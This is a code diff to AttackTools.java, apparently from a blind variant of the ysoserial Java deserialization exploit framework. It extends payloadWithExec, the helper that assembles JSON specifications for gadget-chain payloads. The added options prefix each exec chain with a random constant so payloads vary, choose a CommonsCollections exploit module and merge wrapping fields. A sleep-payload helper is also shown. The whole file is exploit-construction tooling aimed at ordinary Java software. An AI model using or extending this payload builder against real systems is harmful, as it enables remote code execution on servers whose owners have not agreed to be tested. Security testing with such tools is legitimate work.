@@ -3,10 +3,8 @@ package ysoserial.blind;
 import org.json.JSONArray;
 import org.json.JSONObject;
 
-import java.util.Collection;
-import java.util.Collections;
-import java.util.LinkedList;
-import java.util.List;
+import java.security.SecureRandom;
+import java.util.*;
 
 import static ysoserial.blind.Attack.DEFAULT_SLEEP_TIME;
 
@@ -16,6 +14,7 @@ import static ysoserial.blind.Attack.DEFAULT_SLEEP_TIME;
  * Created by dusanklinec on 18.09.16.
  */
 public class AttackTools {
+    private static final SecureRandom rand = new SecureRandom();
 
     public static JSONObject payloadSleep(long val){
         return Utils.parseJSON(String.format("{cmd:\"sleep\", val:%d}", val));
@@ -38,13 +37,49 @@ public class AttackTools {
         return payloadWithExec(Collections.singletonList(obj));
     }
 
+    public static JSONObject payloadWithExec(JSONObject obj, boolean randomize, Integer module, JSONObject aux){
+        return payloadWithExec(Collections.singletonList(obj), randomize, module, aux);
+    }
+
     public static JSONObject payloadWithExec(Collection<JSONObject> objs){
+        return payloadWithExec(objs, true, null, null);
+    }
+
+    /**
+     * Creates the payload JSON specification from the exec chain.
+     * @param objs exec chain
+     * @param randomize if true the chain is prefixed by ConstTransformer with random value.
+     * @param module CommonsCollection exploit version
+     * @param aux Another JSON object which will be merged with the main JSON specification. May contain wrapping structure.
+     * @return payload JSON specification
+     */
+    public static JSONObject payloadWithExec(Collection<JSONObject> objs, boolean randomize, Integer module, JSONObject aux){
         JSONObject ps = new JSONObject();
         JSONArray exec = new JSONArray();
+
+        // Randomize payload with new constant random prefix - the first in chain.
+        if (randomize){
+            exec.put(Utils.parseJSON(String.format("{cmd:\"const\", long: %s}", rand.nextLong())));
+        }
+
+        // The core
         for(JSONObject j : objs){
             exec.put(j);
         }
         ps.put("exec", exec);
+
+        // Exploit module - specific one
+        if (module != null){
+            ps.put("module", module);
+        }
+
+        // Merge with this JSONObject. May contain more info
+        if (aux != null) {
+            for (String keyAux : aux.keySet()) {
+                ps.put(keyAux, aux.get(keyAux));
+            }
+        }
+
         return ps;
     }
 
